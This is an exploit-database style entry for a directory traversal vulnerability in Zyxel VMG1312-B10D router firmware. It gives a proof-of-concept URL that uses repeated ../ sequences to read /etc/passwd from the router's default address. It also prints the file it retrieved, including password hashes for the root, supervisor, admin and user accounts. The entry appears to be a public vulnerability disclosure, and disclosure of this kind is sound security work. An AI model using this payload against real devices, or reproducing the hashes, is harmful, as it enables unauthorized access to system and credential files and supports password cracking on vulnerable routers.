# Exploit Title: Zyxel VMG1312-B10D 5.13AAXA.8 - Directory Traversal
# Date: 2018-11-17
# Exploit Author: numan türle
# Vendor Homepage: https://www.zyxel.com/
# Software Link: https://www.zyxel.com/products_services/Wireless-N-VDSL2-4-port-Gateway-with-USB-VMG1312-B10D/
# Tested on: macOS
# Fixed firmware: 5.13(AAXA.8)C0

# PoC
@modem_gateway = "192.168.1.1" // default address

http://@modem_gateway/../../../../../../../../../../../../etc/passwd

here are the contents :

############################## contents ##############################
nobody:x:99:99:nobody:/nonexistent:/bin/false
root:zKtrESdI2DPME:0:0:root:/home/root:/bin/sh
supervisor:.t7H3bCRtJ6UY:12:12:supervisor:/home/supervisor:/bin/sh
admin:avHcRxJLoXvas:21:21:admin:/home/admin:/bin/sh
user:AebeEcyKDnOzI:31:31:user:/home/user:/bin/sh